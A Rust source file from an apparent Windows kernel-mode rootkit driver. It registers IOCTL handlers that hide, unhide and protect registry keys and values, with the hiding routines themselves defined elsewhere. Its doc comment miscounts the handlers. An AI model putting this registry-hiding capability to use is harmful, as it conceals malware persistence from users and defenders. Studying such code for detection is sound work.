#![cfg(not(feature = "mapper"))]

use {
    crate::{handle_registry,registry::{Registry, utils::KeyListType}},
    shared::structs::TargetRegistry,
    crate::utils::ioctls::IoctlHandler, 
    alloc::boxed::Box, 
    hashbrown::HashMap, 
    shared::ioctls::{
        IOCTL_HIDE_UNHIDE_KEY, IOCTL_HIDE_UNHIDE_VALUE, IOCTL_REGISTRY_PROTECTION_KEY, 
        IOCTL_REGISTRY_PROTECTION_VALUE
    }, 
    wdk_sys::{IO_STACK_LOCATION, IRP}
};

/// Registers the IOCTL handlers for registry-related operations.
///
/// This function inserts two IOCTL handlers into the provided `HashMap`, associating them with
/// their respective IOCTL codes. The two operations supported are:
///
/// # Parameters
/// 
/// - `ioctls`: A mutable reference to a `HashMap<u32, IoctlHandler>` where the registry-related
///   IOCTL handlers will be inserted.
///
pub fn get_registry_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
    // Adding protection for registry key values.
    ioctls.insert(IOCTL_REGISTRY_PROTECTION_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle_registry!(stack, Registry::add_remove_registry_toggle, TargetRegistry, KeyListType::Protect) };
        unsafe { (*irp).IoStatus.Information = 0 };
        status
    }) as IoctlHandler);
    
    // Added protection for registry keys.
    ioctls.insert(IOCTL_REGISTRY_PROTECTION_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle_registry!(stack, Registry::add_remove_key_toggle, TargetRegistry, KeyListType::Protect) };
        unsafe { (*irp).IoStatus.Information = 0 };
        status
    }) as IoctlHandler);

    // Handles IOCTL to hide or unhide a registry key
    ioctls.insert(IOCTL_HIDE_UNHIDE_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle_registry!(stack, Registry::add_remove_key_toggle, TargetRegistry, KeyListType::Hide) };
        unsafe { (*irp).IoStatus.Information = 0 };
        status
    }) as IoctlHandler);

    // Handles IOCTL to hide or unhide a registry value
    ioctls.insert(IOCTL_HIDE_UNHIDE_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle_registry!(stack, Registry::add_remove_registry_toggle, TargetRegistry, KeyListType::Hide) };
        unsafe { (*irp).IoStatus.Information = 0 };
        status
    }) as IoctlHandler);
}